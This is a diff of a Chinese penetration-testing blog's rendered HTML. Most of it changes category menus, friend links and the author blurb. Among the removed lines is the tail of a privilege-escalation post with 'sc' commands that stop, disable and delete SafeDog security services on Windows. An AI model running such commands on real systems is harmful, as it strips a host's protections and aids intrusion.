-<p>(2)直接删除SafeDogGuardCenter服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sc stop <span class="string">"SafeDogGuardCenter"</span>  </span><br><span class="line">sc config <span class="string">"SafeDogGuardCenter"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">"SafeDogGuardCenter"</span> </span><br><span class="line"> </span><br><span class="line">sc stop <span class="string">" SafeDogUpdateCenter"</span>  </span><br><span class="line">sc config <span class="string">" SafeDogUpdateCenter"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">" SafeDogUpdateCenter"</span> </span><br><span class="line"> </span><br><span class="line">sc stop <span class="string">" SafeDogCloudHelper"</span>  </span><br><span class="line">sc config <span class="string">" SafeDogCloudHelper"</span> start= disabled  </span><br><span class="line">sc delete <span class="string">" SafeDogCloudHelper"</span></span><br></pre></td></tr></table></figure></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/提权免杀/">提权免杀</a>►<a class="article-category-link" href="/categories/提权免杀/windows提权/">windows提权</a>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
 </div>
 
 
@@ -919,7 +816,7 @@
 
 
   <nav id="page-nav" class="clearfix">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
   </nav>
 
 </div>
@@ -935,42 +832,11 @@
   
 <div class="category-block">
   <h3 class="asidetitle">分类</h3>
-     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/git/hexo/">hexo</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/parrot/">parrot</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/windows/Windows2003/">Windows2003</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/">提权免杀</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/提权免杀/windows提权/">windows提权</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">27</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
 </div>
 
 
   
-<div class="tagslist">
-	<p class="asidetitle">标签</p>
-		<ul class="clearfix">
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-		</ul>
-</div>
-
 
   <div class="linkslist">
   <p class="asidetitle">友情链接</p>
@@ -984,7 +850,61 @@
         
           <li>
             
-            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            	<a href="https://dillinger.io" target="_blank" title="在线看makedown编译出的效果">makedown</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://mochazz.github.io" target="_blank" title="一个审计大佬的博客">审计</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.php.cn/course/74.html" target="_blank" title="php官方网站">php</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://blog.51cto.com/simeon" target="_blank" title="一个经常发布资源大佬的博客">资源</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.liaoxuefeng.com" target="_blank" title="学习python的个人博客">python</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.kanxue.com" target="_blank" title="二进制安全学习窝">看雪</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="www.secquan.org" target="_blank" title="常混的论坛">圈子</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.2cto.com" target="_blank" title="各种渗透书籍随便挑">红黑联盟</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.cnblogs.com" target="_blank" title="一个内网大佬的博客">linuxsec</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.runoob.com" target="_blank" title="学习各种编程脚本的好地方">W3C</a>
             
           </li>
         
@@ -1016,7 +936,7 @@
 	
 	
 	<section class="info">
-		<p> Hello ,I&#39;m Larry Page in Google. <br/>
+		<p> Hello ,I&#39;m Bug`小虫 Page in Google. <br/>
 			This is my blog,believe it or not.</p>
 	</section>
 	 
